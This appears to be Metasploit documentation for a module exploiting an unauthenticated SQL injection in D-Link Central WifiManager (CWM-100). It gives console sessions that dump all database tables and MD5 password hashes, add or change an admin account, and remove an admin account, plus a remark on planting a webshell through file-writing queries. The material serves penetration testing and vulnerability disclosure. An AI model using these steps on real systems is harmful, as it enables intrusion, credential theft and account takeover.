## Vulnerable Application

This module exploits a vulnerability in Dlink Central
WifiManager (CWM-100), found in versions lower than
v1.03R0100_BETA6, allowing unauthenticated users to
execute arbitary SQL queries.

This module has 3 actions:

| Action        | Description                |
| ------------- | -------------------------- |
| SQLI_DUMP     | Data retrieval*            |
| ADD_ADMIN     | Creation of an admin user  |
| REMOVE_ADMIN  | Removal of an admin user   |

\* : each table is saved in the loot directory in CSV format, credentials (password hashes) are saved as
creds for future cracking.

Has been tested with 1.03r098.

## Verification Steps

1. Download the vulnerable software, and install it
- Run the vulnerable software, downloadable from
  [here](https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10117).
- direct download link:
  `ftp://ftp2.dlink.com/SOFTWARE/CENTRAL_WIFI_MANAGER/CENTRAL_WI-FI_MANAGER_1.03.zip
2. Reproduction steps
- Run `msfconsole`
- set rhosts ...
- set action ...
- `check` or `exploit`
- should work as in the scenarios below

## Actions

```
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > show actions

Auxiliary actions:

   Name         Description
   ----         -----------
   ADD_ADMIN    Add an administrator user
   REMOVE_ADMIN Remove a user
   SQLI_DUMP    Retrieve all the data from the database

```

## Options

```
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > show options

Module options (auxiliary/sqli/dlink/dlink_central_wifimanager_sqli):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   Admin_Password  anything         no        The password of the user to add/edit
   Admin_Username  red0xff          no        The username of the user to add/remove
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          192.168.1.223    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           443              yes       The target port (TCP)
   SSL             true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI       /                yes       The base path to DLink CWM-100
   VHOST                            no        HTTP server virtual host

```

## Scenarios

This module has both `check` and `run` functions.

### Retrieving all the data from the database

```
msf5 > use auxiliary/sqli/dlink/dlink_central_wifimanager_sqli 
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set action SQLI_DUMP 
action => SQLI_DUMP
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set rhosts 192.168.1.223
rhosts => 192.168.1.223
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > check 

[+] 192.168.1.223:443 - The target is vulnerable.
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > run
[*] Running module against 192.168.1.223

[+] Target seems vulnerable
[+] DBMS version: PostgreSQL 9.1.0, compiled by Visual C++ build 1500, 32-bit
[*] Enumerating tables
[+] grouptossltable saved to /home/redouane/.msf4/loot/20200828180148_default_192.168.1.223_dlink.http_187571.csv
[+] paypalsettingtable saved to /home/redouane/.msf4/loot/20200828180149_default_192.168.1.223_dlink.http_642251.csv
[+] ordertable saved to /home/redouane/.msf4/loot/20200828180149_default_192.168.1.223_dlink.http_944954.csv

...

[+] tempstationtable saved to /home/redouane/.msf4/loot/20200828180505_default_192.168.1.223_dlink.http_577215.csv
[+] Saved credentials for admin
[+] Saved credentials for red0xff
[+] usertable saved to /home/redouane/.msf4/loot/20200828180153_default_192.168.1.223_dlink.http_608945.csv

...

[+] devicesnmpsecuritytable saved to /home/redouane/.msf4/loot/20200828180154_default_192.168.1.223_dlink.http_825556.csv
[*] Auxiliary module execution completed
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > 
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > creds
Credentials
===========

host  origin         service  public   private                           realm  private_type        JtR Format
----  ------         -------  ------   -------                           -----  ------------        ----------
      192.168.1.223           admin    21232f297a57a5a743894a0e4a801fc3         Nonreplayable hash  raw-md5
      192.168.1.223           red0xff  f0e166dc34d14d6c228ffac576c9a43c         Nonreplayable hash  raw-md5

msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > 
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > loot

Loot
====

host           service  type        name                         content          info  path
----           -------  ----        ----                         -------          ----  ----
192.168.1.223           dlink.http  biggrouptable.csv            application/csv        /home/redouane/.msf4/loot/20200828180503_default_192.168.1.223_dlink.http_360290.csv
192.168.1.223           dlink.http  devicetable.csv              application/csv        /home/redouane/.msf4/loot/20200828180503_default_192.168.1.223_dlink.http_230830.csv

...

ult_192.168.1.223_dlink.http_878195.csv
192.168.1.223           dlink.http  devicesnmpsecuritytable.csv  application/csv        /home/redouane/.msf4/loot/20200828180506_default_192.168.1.223_dlink.http_086271.csv

msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > 
```

### Adding an admin user/changing the password of a user

```
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set action ADD_ADMIN 
action => ADD_ADMIN
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set Admin_Username msfadmin
Admin_Username => msfadmin
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set Admin_Password msfadmin
Admin_Password => msfadmin
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > run
[*] Running module against 192.168.1.223

[+] Target seems vulnerable
[*] User not found on the target, inserting
[*] Auxiliary module execution completed
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set Admin_Password msfpassword
Admin_Password => msfpassword
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > run
[*] Running module against 192.168.1.223

[*] Trying to detect installed version
[+] Target seems vulnerable
[*] User already exists, updating the password
[*] Auxiliary module execution completed
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > 
```

### Deleting an administrator user

```
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set action REMOVE_ADMIN 
action => REMOVE_USER
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set Admin_Username red0xff
Admin_Username => red0xff
msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > run
[*] Running module against 192.168.1.223

[+] Target seems vulnerable
[*] Auxiliary module execution completed
```

### Going further

It is possible to upload arbitary files to the target system using queries of the form
(copy ... to ...), but using full paths, the attacker must know the path of the webroot
to upload a webshell this way.
